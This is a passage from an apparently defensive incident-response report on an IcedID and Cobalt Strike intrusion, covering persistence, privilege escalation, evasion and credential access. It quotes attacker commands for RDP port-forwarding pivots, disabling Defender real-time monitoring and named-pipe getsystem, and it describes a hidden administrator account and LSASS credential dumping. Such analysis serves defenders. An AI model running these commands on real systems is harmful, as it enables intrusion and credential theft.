<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32068" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-012.png" alt="" width="2000" height="1071" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-012.png 2000w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-012-300x161.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-012-1024x548.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-012-768x411.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-012-1536x823.png 1536w" sizes="(max-width: 2000px) 100vw, 2000px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>By executing the PowerShell script and monitoring the API calls performed by the process through API Monitor, it is possible to identify the calls to InternetConnectA() with the Cobalt Strike C2s specified as parameters.</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32069" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-013.png" alt="" width="1860" height="529" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-013.png 1860w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-013-300x85.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-013-1024x291.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-013-768x218.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-013-1536x437.png 1536w" sizes="(max-width: 1860px) 100vw, 1860px" /></a></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32070" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-014.png" alt="" width="1845" height="501" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-014.png 1845w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-014-300x81.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-014-1024x278.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-014-768x209.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-014-1536x417.png 1536w" sizes="(max-width: 1845px) 100vw, 1845px" /></a></p>
<!-- /wp:image -->

<!-- wp:image --><!-- /wp:image -->

<!-- wp:paragraph -->
<p>Existing Yara rules detect Cobalt Strike beacons by hunting for the previously mentioned header like the following one, however, defenders need to be aware that those types of strings can be modified from beacons through malleable profiles.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32189" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-015.png" alt="" width="1324" height="769" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-015.png 1324w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-015-300x174.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-015-1024x595.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-015-768x446.png 768w" sizes="(max-width: 1324px) 100vw, 1324px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:embed {"url":"https://github.com/elastic/protections-artifacts/blob/72fd8cad90189e9d145d22eb3d4fee2fe3d5902f/yara/rules/Windows_Trojan_CobaltStrike.yar#L1011"} -->
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/elastic/protections-artifacts/blob/72fd8cad90189e9d145d22eb3d4fee2fe3d5902f/yara/rules/Windows_Trojan_CobaltStrike.yar#L1011" target="_blank" rel="noopener">https://github.com/elastic/protections-artifacts/blob/72fd8cad90189e9d145d22eb3d4fee2fe3d5902f/yara/rules/Windows_Trojan_CobaltStrike.yar#L1011</a></div>
<div> </div>
</figure>
<!-- /wp:embed -->

<!-- wp:heading -->
<h2 id="persistence" class="wp-block-heading"><a href="#persistence">Persistence</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>IcedID</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>During the execution of the initial IcedID malware, a scheduled task was created to maintain persistence.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32073" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-016.png" alt="" width="1283" height="833" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-016.png 1283w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-016-300x195.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-016-1024x665.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-016-768x499.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-016-1000x650.png 1000w" sizes="(max-width: 1283px) 100vw, 1283px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The task was set to run when the user logged in using the &#8216;LogonTrigger&#8217;. While audit logging was not enabled to observe the task creation via a 4698 event we were able to use Sysmon registry and file creation events for the task XML to correlate the creation with the initial IcedID malware.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Registry item related to task creation:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32074" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-017.png" alt="" width="636" height="194" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-017.png 636w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-017-300x92.png 300w" sizes="(max-width: 636px) 100vw, 636px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>File write for task XML:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32075" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-018.png" alt="" width="627" height="178" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-018.png 627w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-018-300x85.png 300w" sizes="(max-width: 627px) 100vw, 627px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Cobalt Strike</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The threat actor created several scheduled tasks on different servers, to achieve persistent execution of Cobalt Strike. As you can see below, the scheduled task files were created by a <code>svchost</code> injected process.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32076" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-019.png" alt="" width="1478" height="239" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-019.png 1478w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-019-300x49.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-019-1024x166.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-019-768x124.png 768w" sizes="(max-width: 1478px) 100vw, 1478px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>This is an example of one of the scheduled tasks created that, when executed, downloads and executes a Cobalt Strike beacon from<code>51.89.133[.]3</code>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32077" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-020.png" alt="" width="1400" height="1033" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-020.png 1400w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-020-300x221.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-020-1024x756.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-020-768x567.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Furthermore, on a domain controller, the threat actor created a bat file under the local group policy directory.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">C:\Windows\System32\GroupPolicy\User\Scripts\Logon\test.bat
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The bat file contains the same PowerShell command as the scheduled task. These were then setup to execute at login by GPO policy targeting users in a specific domain group.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32078" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-021.png" alt="" width="655" height="397" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-021.png 655w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-021-300x182.png 300w" sizes="(max-width: 655px) 100vw, 655px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>These same scheduled tasks could be located in the GPO policies under SYSVOL on the domain controller, below is an example of one pulled from a memory capture.</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32079" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-022.png" alt="" width="2532" height="944" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-022.png 2532w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-022-300x112.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-022-1024x382.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-022-768x286.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-022-1536x573.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-022-2048x764.png 2048w" sizes="(max-width: 2532px) 100vw, 2532px" /></a><img alt="" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Anydesk</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>During the intrusion, the threat actor used a PowerShell script named <code>anydesk.ps1</code> to:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Download AnyDesk into the ProgramData folder.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Install AnyDesk in silent mode and set the password to access the software remotely.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Create a user named <code>oldadministrator</code>, add it to the local administrator group, and hide it from the Windows home/login screen.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32080" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-023.png" alt="" width="2228" height="1256" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-023.png 2228w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-023-300x169.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-023-1024x577.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-023-768x433.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-023-1536x866.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-023-2048x1155.png 2048w" sizes="(max-width: 2228px) 100vw, 2228px" /></a></p>
<p>Installing AnyDesk in this way sets up the program with a service to start automatically, providing the threat actor with an additional means of persistence in the network.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32081" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-024.png" alt="" width="547" height="136" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-024.png 547w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-024-300x75.png 300w" sizes="(max-width: 547px) 100vw, 547px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The AnyDesk ad.trace logs track incoming connections into the system. Those logs can be found under the folder <code>C:\Users\&lt;user&gt;\AppData\Roaming\AnyDesk</code>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32082" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-025.png" alt="" width="2000" height="263" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-025.png 2000w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-025-300x39.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-025-1024x135.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-025-768x101.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-025-1536x202.png 1536w" sizes="(max-width: 2000px) 100vw, 2000px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The ad_svc.trace log files record the external IP addresses that logged into the system. Those logs can be found under the folder <code>C:\ProgramData\Anydesk</code>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32083" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-026.png" alt="" width="1952" height="283" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-026.png 1952w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-026-300x43.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-026-1024x148.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-026-768x111.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-026-1536x223.png 1536w" sizes="(max-width: 1952px) 100vw, 1952px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>AnyDesk Client-ID:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Client-ID: 150937834
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The following two IP addresses were identified that could be related to VPN services based on IPQualityScore:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>82.102.18.244 &#8211; NordVPN</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>194.33.40.113 &#8211; Surfshark VPN</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>New User Creation</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The <code>anydesk.ps1</code> script included the creation of a new user account, which was then added to the local administrators group and then hid from the logon screen. This latter technique is performed by setting the value of the following registry key related to the specific user, to &#8220;0&#8221;:</p>
<pre><code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist</code></pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32084" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-027.png" alt="" width="1427" height="379" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-027.png 1427w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-027-300x80.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-027-1024x272.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-027-768x204.png 768w" sizes="(max-width: 1427px) 100vw, 1427px" /></p>
<p>&nbsp;</p>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 id="privilege-escalation" class="wp-block-heading"><a href="#privilege-escalation">Privilege Escalation</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>To obtain SYSTEM privileges, the threat actor executed the getsystem Cobalt Strike functionality multiple times.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>We saw the threat actor use variations of this which indicates likely getsystem activity:</p>
<pre>C:\Windows\system32\cmd.exe /c echo 00e4f7418cd &gt; \\.\pipe\9090e9</pre>
<!-- /wp:list -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32085" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-028.png" alt="" width="793" height="312" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-028.png 793w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-028-300x118.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-028-768x302.png 768w" sizes="(max-width: 793px) 100vw, 793px" /></a></p>
<p>This technique was thoroughly described here:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><a href="https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/#privilege-escalation" target="_blank" rel="noreferrer noopener">SEO Poisoning to Domain Control: The Gootloader Saga Continues</a></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>When the threat actor created the new user account, they also also added that new account to a privileged active directory group.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32086" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-029.png" alt="" width="610" height="349" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-029.png 610w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-029-300x172.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="defense-evasion" class="wp-block-heading"><a href="#defense-evasion">Defense Evasion</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>Process Injection</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>As mentioned in the <a href="#execution">Execution</a> section, we see IcedID injecting itself into svchost.exe</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32087" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-030.png" alt="" width="493" height="244" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-030.png 493w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-030-300x148.png 300w" sizes="(max-width: 493px) 100vw, 493px" /></a></p>
<p>We also observed Cobalt Strike injecting into gpupdate.exe. Later they injected themselves into svchost.exe. This was done as a result of using named pipe impersonation to get SYSTEM rights on the client.</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32088" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-031.png" alt="" width="1854" height="242" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-031.png 1854w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-031-300x39.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-031-1024x134.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-031-768x100.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-031-1536x200.png 1536w" sizes="(max-width: 1854px) 100vw, 1854px" /></a></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32090" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-032.png" alt="" width="2569" height="98" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-032.png 2569w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-032-300x11.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-032-1024x39.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-032-768x29.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-032-1536x59.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-032-2048x78.png 2048w" sizes="(max-width: 2569px) 100vw, 2569px" /></a></p>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Dumping PID 4860 from memory and scanning with YARA rules from the <a href="https://github.com/search?q=repo%3ANeo23x0%2Fsignature-base%20cobalt%20strike&amp;type=code" target="_blank" rel="noreferrer noopener">LOKI signature base</a> we can find evidence of the Cobalt Strike injection.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Volatility dump command:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">vol -f [REDACTED].dmp  windows.memmap.Memmap --dump --pid 4860
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Scan results:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32091" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-033.png" alt="" width="1343" height="82" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-033.png 1343w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-033-300x18.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-033-1024x63.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-033-768x47.png 768w" sizes="(max-width: 1343px) 100vw, 1343px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>We can get further corroboration with <a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py" target="_blank" rel="noreferrer noopener">1768.py</a>:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-034.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32092" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-034.png" alt="" width="537" height="52" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-034.png 537w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-034-300x29.png 300w" sizes="(max-width: 537px) 100vw, 537px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>We can also use the memory file processed with <a href="https://github.com/ufrisk/MemProcFS" target="_blank" rel="noreferrer noopener">MemprocFS</a> for similar YARA scan hits:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-035.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32093" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-035.png" alt="" width="712" height="683" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-035.png 712w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-035-300x288.png 300w" sizes="(max-width: 712px) 100vw, 712px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Disable or Modify System Firewall</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>We observed the threat actor attempting to access a restricted host by pivoting through another host.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This was attempted by using the built-in netsh portproxy command to port forward 3390 on the local host, to 3389 (RDP) on the remote host.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>We also observed the threat actor testing this access using the PowerShell function <code>Test-NetConnection</code><code></code></p>
<!-- wp:paragraph -->
<pre>"C:\Windows\system32\netsh.exe" interface portproxy add v4tov4 listenport=3390 listenaddress=REDACTED connectport=3389 connectaddress=REDACTED<br />netsh advfirewall firewall add rule name=”forwarded” protocol=TCP dir=in localip=REDACTED localport=3390 action=allow<br />Test-NetConnection -ComputerName REDACTED -Port 3390<br />"C:\Windows\system32\netsh.exe" interface portproxy show all</pre>
<p><strong>Disabling Microsoft Defender</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>During the intrusion, we observed limited use of the following command to disable antivirus:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Set-MpPreference -DisableRealtimeMonitoring $true
</pre>
<!-- /wp:preformatted -->

<!-- wp:heading -->
<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>LSASS Credential Dump</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Cobalt Strike provides multiple functionalities to extract hashed credentials stored in the LSASS process, such as <code>logonpassword</code><em>.</em> This command leverages the Mimikatz <code>sekurlsa::logonpasswords</code>technique to harvest credentials in memory. To detect this type of malicious action, it&#8217;s crucial to install and configure Sysmon correctly which allows tracking access to the LSASS memory, as shown in the image below.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32094" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-036.png" alt="" width="1778" height="581" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-036.png 1778w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-036-300x98.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-036-1024x335.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-036-768x251.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-036-1536x502.png 1536w" sizes="(max-width: 1778px) 100vw, 1778px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Every access to the LSASS process with the following GrantedAccess types should generate security alerts:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>0x1010 (PROCESS_QUERY_LIMITED_INFORMATION + PROCESS_VM_READ)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>0x1410 (PROCESS_QUERY_LIMITED_INFORMATION + PROCESS_QUERY_INFORMATION + PROCESS_VM_READ)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Further information about access rights can be found here:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights?redirectedfrom=MSDN" target="_blank" rel="noreferrer noopener">Process Security and Access Rights &#8211; Win32 apps | Microsoft Learn</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Clear-Text Password Files</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The threat actor exploited a common administrator mistake: writing clear-text credentials in text files that are accessible through network shares. We observed the threat actor reviewing such documents in a share folder labeled Passwords using both Notepad and type over the command line process activity in Sysmon Event ID 1 logging.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32095" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-037.png" alt="" width="1749" height="200" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-037.png 1749w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-037-300x34.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-037-1024x117.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-037-768x88.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-037-1536x176.png 1536w" sizes="(max-width: 1749px) 100vw, 1749px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>IcedID</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>As usual, we also observed the standard initial discovery commands that IcedID typically does.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Our previous report has a good summary of why these commands happen, and recommendations: <a href="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/#discovery" target="_blank" rel="noreferrer noopener">https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/#discovery</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
